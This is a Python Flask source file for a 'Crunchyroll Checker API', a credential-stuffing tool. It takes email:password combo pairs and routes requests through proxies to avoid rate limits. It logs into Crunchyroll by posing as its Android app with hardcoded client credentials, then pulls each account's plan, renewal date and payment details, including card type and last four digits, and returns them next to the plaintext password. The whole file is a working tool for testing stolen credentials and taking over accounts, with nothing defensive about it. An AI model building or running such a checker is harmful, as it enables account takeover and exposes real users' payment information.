from flask import Flask, request
import requests
from urllib.parse import quote
from datetime import datetime
import pytz

app = Flask(__name__)

UA = "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Chrome/123.0 Safari/537.36"

def format_proxy(proxy_string):
    if not proxy_string:
        return None
    if "@" in proxy_string:
        if not proxy_string.startswith("http"):
            proxy_string = "http://" + proxy_string
        return {"http": proxy_string, "https": proxy_string}
    parts = proxy_string.split(":")
    if len(parts) == 4:
        ip, port, user, pwd = parts
        pstr = f"http://{user}:{pwd}@{ip}:{port}"
        return {"http": pstr, "https": pstr}
    elif len(parts) == 2:
        ip, port = parts
        pstr = f"http://{ip}:{port}"
        return {"http": pstr, "https": pstr}
    return None

def get_access_token(email, password, proxy=None):
    session = requests.Session()
    proxies = format_proxy(proxy) if proxy else None

    common_headers = {
        "Accept-Encoding": "gzip",
        "Connection": "Keep-Alive",
        "x-datadog-sampling-priority": "0",
        "Accept": "application/json, text/plain, */*",
        "Accept-Language": "en-GB,en-US;q=0.9,en;q=0.8",
        "Referer": "https://www.crunchyroll.com/",
        "Origin": "https://www.crunchyroll.com/",
    }
    auth_request_headers = {
        **common_headers,
        "User-Agent": "Crunchyroll/3.78.3 Android/9 okhttp/4.12.0",
        "Authorization": "Basic bWZsbzhqeHF1cTFxeWJwdmY3cXA6VEFlTU9SRDBGRFhpdGMtd0l6TVVfWmJORVRRT2pXWXg=",
        "Content-Type": "application/x-www-form-urlencoded",
        "Host": "beta-api.crunchyroll.com",
        "ETP-Anonymous-ID": "ccdcc444-f39c-48c3-9aa1-f72ebb93dfb1",
    }
    data = f"username={quote(email)}&password={quote(password)}&grant_type=password&scope=offline_access&device_id=14427c33-1893-4bc5-aaf3-dea072be2831&device_type=Chrome%20on%20Android"
    try:
        res = session.post(
            "https://beta-api.crunchyroll.com/auth/v1/token",
            headers=auth_request_headers, data=data, proxies=proxies, timeout=15
        )
        if res.status_code in [403, 429, 500, 502, 503]:
            return None, "Blocked/RateLimited by Crunchyroll/Proxy.", session
        if "invalid_credentials" in res.text:
            return None, "Invalid Credentials.", session

        try:
            json_res = res.json()
        except Exception:
            return None, "Crunchyroll sent invalid JSON at login.", session

        token = json_res.get("access_token")
        if not token or json_res.get("error") or json_res.get("unsupported_grant_type"):
            return None, "Invalid Credentials.", session

        return token, None, session
    except Exception as ex:
        return None, f"Unknown Error: {ex}", session

def fetch_web_account_details(session, token, email, password, proxies=None, ua=None):
    UA = ua or "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Chrome/123.0 Safari/537.36"
    me_headers = {
        "User-Agent": UA,
        "Authorization": f"Bearer {token}",
    }
    try:
        me_res = session.get(
            "https://www.crunchyroll.com/accounts/v1/me",
            headers=me_headers,
            proxies=proxies,
            timeout=10
        )
        if me_res.status_code != 200 or not me_res.headers.get("Content-Type", "").startswith("application/json"):
            return f"Failed to fetch account ID.", None
        me_json = me_res.json()
        account_id = me_json.get("account_id")
        if not account_id:
            return f"No account_id in Crunchyroll response.", None
    except Exception as e:
        return f"Exception getting account ID: {e}", None

    subs_headers = {
        "Host": "www.crunchyroll.com",
        "User-Agent": UA,
        "Accept": "application/json, text/plain, */*",
        "Authorization": f"Bearer {token}",
        "Referer": "https://www.crunchyroll.com/account/membership"
    }
    try:
        subs_res = session.get(
            f"https://www.crunchyroll.com/subs/v4/accounts/{account_id}/subscriptions",
            headers=subs_headers,
            proxies=proxies,
            timeout=20
        )
        if subs_res.status_code != 200:
            return "Failed to fetch subscription details.", None
        data = subs_res.json()
    except Exception as e:
        return f"Exception fetching subs: {e}", None

    if data.get("containerType") == "free":
        msg = "Free Account"
        return msg, {
            "Account": f"{email}:{password}",
            "Country": "N/A",
            "Plan": "Free",
            "Payment": "N/A",
            "Trial": "False",
            "Status": "free",
            "Renewal": "N/A",
            "Days Left": "N/A"
        }

    subscriptions = data.get("subscriptions", [])
    plan_text = plan_value = active_free_trial = next_renewal_date = status = "N/A"
    payment_info = country_code = payment_method_type = "N/A"

    if subscriptions:
        plan = subscriptions[0].get("plan", {})
        tier = plan.get("tier", {})
        plan_text = tier.get("text") or plan.get("name", {}).get("text") or tier.get("value") or plan.get("name", {}).get("value") or "N/A"
        plan_value = tier.get("value") or plan.get("name", {}).get("value") or "N/A"
        active_free_trial = str(subscriptions[0].get("activeFreeTrial", False))
        next_renewal_date = subscriptions[0].get("nextRenewalDate", "N/A")
        status = subscriptions[0].get("status", "N/A")

    payment = data.get("currentPaymentMethod", {})
    if payment:
        payment_type = payment.get("paymentMethodType", "")
        payment_name = payment.get("name", "")
        payment_last4 = payment.get("lastFour", "")
        country_code = payment.get("countryCode", "N/A")
        if payment_type == "credit_card" and payment_name and payment_last4:
            payment_info = f"{payment_name} ending in {payment_last4} ({payment_type})"
        elif payment_name and payment_type and payment_last4:
            payment_info = f"{payment_name} ending in {payment_last4} ({payment_type})"
        elif payment_name and payment_type:
            payment_info = f"{payment_name} ({payment_type})"
        elif payment_name:
            payment_info = payment_name
        elif payment_type:
            payment_info = payment_type
        else:
            payment_info = "N/A"
    else:
        payment_info = "N/A"
        country_code = "N/A"

    if next_renewal_date not in ["N/A", "None"]:
        try:
            renewal_dt = datetime.strptime(next_renewal_date, "%Y-%m-%dT%H:%M:%SZ").replace(tzinfo=pytz.UTC)
            formatted_renewal_date = renewal_dt.strftime("%d-%m-%Y")
            ist = pytz.timezone("Asia/Kolkata")
            current_dt = datetime.now(ist)
            days_left = (renewal_dt.astimezone(ist) - current_dt).days
            if days_left < 0:
                days_left = 0
        except Exception:
            formatted_renewal_date = next_renewal_date
            days_left = "N/A"
    else:
        formatted_renewal_date = next_renewal_date
        days_left = "N/A"

    msg = "Premium Account" if status == "active" else "Account Found"
    details = {
        "Account": f"{email}:{password}",
        "Country": country_code,
        "Plan": f"{plan_text}—{plan_value}",
        "Payment": payment_info,
        "Trial": "True" if active_free_trial == "True" else "False",
        "Status": status,
        "Renewal": formatted_renewal_date,
        "Days Left": days_left
    }
    return msg, details

@app.route("/check", methods=["GET", "POST"])
def check():
    combo = request.values.get("email", "").strip()
    proxy = request.values.get("proxy", "")

    if ":" not in combo or not combo:
        return "Response : Login Failed\nSuccess : False", 400
    email, password = combo.split(":", 1)
    if not email or not password:
        return "Response : Login Failed\nSuccess : False", 400

    token, login_err, session = get_access_token(email, password, proxy if proxy else None)
    if not token:
        return "Response : Login Failed\nSuccess : False", 200, {"Content-Type": "text/plain"}

    msg, details = fetch_web_account_details(session, token, email, password, proxies=format_proxy(proxy) if proxy else None, ua=UA)
    if not details:
        resp_str = f"""Response : Login Success
Success : True

Account: {email}:{password}
Country: N/A
Plan: N/A
Payment: N/A
Trial: N/A
Status: N/A
Renewal: N/A
Days Left: N/A
"""
        return resp_str, 200, {"Content-Type": "text/plain"}

    resp_str = f"""Response : Login Success
Success : True

Account: {details['Account']}
Country: {details['Country']}
Plan: {details['Plan']}
Payment: {details['Payment']}
Trial: {details['Trial']}
Status: {details['Status']}
Renewal: {details['Renewal']}
Days Left: {details['Days Left']}
"""
    return resp_str, 200, {"Content-Type": "text/plain"}

@app.route("/")
def home():
    return "<h3>Crunchyroll Checker API<br>Use /check?email=email:pass&proxy=proxy</h3>"

if __name__ == "__main__":
    app.run(host="0.0.0.0", port=5000, debug=True)
